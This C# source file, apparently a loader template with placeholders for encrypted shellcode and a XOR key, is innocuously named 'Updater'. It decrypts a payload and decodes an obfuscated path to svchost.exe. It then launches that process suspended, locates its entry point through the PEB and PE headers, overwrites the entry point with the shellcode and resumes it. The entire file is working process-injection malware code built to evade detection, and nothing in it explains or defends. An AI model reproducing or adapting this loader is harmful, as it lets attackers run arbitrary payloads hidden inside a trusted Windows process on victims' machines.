using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

public class Updater
{
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr ExitStatus;
        public IntPtr PebAddress;
        public IntPtr AffinityMask;
        public IntPtr BasePriority;
        public IntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }

    const uint CREATE_SUSPENDED = 0x00000004;
    const int ProcessBasicInformation = 0;

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll")]
    static extern int NtQueryInformationProcess(IntPtr hProcess, int processInformationClass, ref PROCESS_BASIC_INFORMATION processInformation, uint processInformationLength, ref uint returnLength);

    [DllImport("ntdll.dll")]
    static extern int NtReadVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int NumberOfBytesToRead, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int NumberOfBytesToWrite, out IntPtr lpNumberOfBytesWritten);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern bool NtResumeProcess(IntPtr hThread);

    public static void Main(string[] args)
    {
        // Shellcode
        {encrypted_shellcode}

        // Decrypt shellcode
        int i = 0;
        while (i < buf.Length)
        {
            buf[i] = (byte)(buf[i] ^ {xor_key});
            i++;
        }

        // Resolve host process path at runtime (XOR-obfuscated string)
        byte[] hp = new byte[] { 0x01, 0x78, 0x1E, 0x15, 0x2B, 0x2C, 0x26, 0x2D, 0x35, 0x31, 0x1E, 0x11, 0x3B, 0x31, 0x36, 0x27, 0x2F, 0x71, 0x70, 0x1E, 0x31, 0x34, 0x21, 0x2A, 0x2D, 0x31, 0x36, 0x6C, 0x27, 0x3A, 0x27 };
        for (int q = 0; q < hp.Length; q++) hp[q] ^= 0x42;
        string hostPath = System.Text.Encoding.ASCII.GetString(hp);

        // Spawn host process in suspended state
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        CreateProcess(null, hostPath, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

        // Locate the host process PEB
        PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
        uint tmp = 0;
        IntPtr hProcess = pi.hProcess;
        NtQueryInformationProcess(hProcess, ProcessBasicInformation, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

        // Read ImageBaseAddress from PEB+0x10
        IntPtr ptrImageBaseAddress = (IntPtr)((Int64)bi.PebAddress + 0x10);
        byte[] baseAddressBytes = new byte[IntPtr.Size];
        IntPtr nRead;
        NtReadVirtualMemory(hProcess, ptrImageBaseAddress, baseAddressBytes, baseAddressBytes.Length, out nRead);
        IntPtr imageBaseAddress = (IntPtr)(BitConverter.ToInt64(baseAddressBytes, 0));

        // Parse PE headers to find AddressOfEntryPoint (e_lfanew + 0x28)
        byte[] data = new byte[0x200];
        NtReadVirtualMemory(hProcess, imageBaseAddress, data, data.Length, out nRead);
        uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
        uint entrypointRva = BitConverter.ToUInt32(data, (int)(e_lfanew + 0x28));
        IntPtr entrypointAddress = (IntPtr)((UInt64)imageBaseAddress + entrypointRva);

        // Overwrite the entry point with shellcode and resume the process
        WriteProcessMemory(hProcess, entrypointAddress, buf, buf.Length, out nRead);
        NtResumeProcess(pi.hProcess);
    }
}
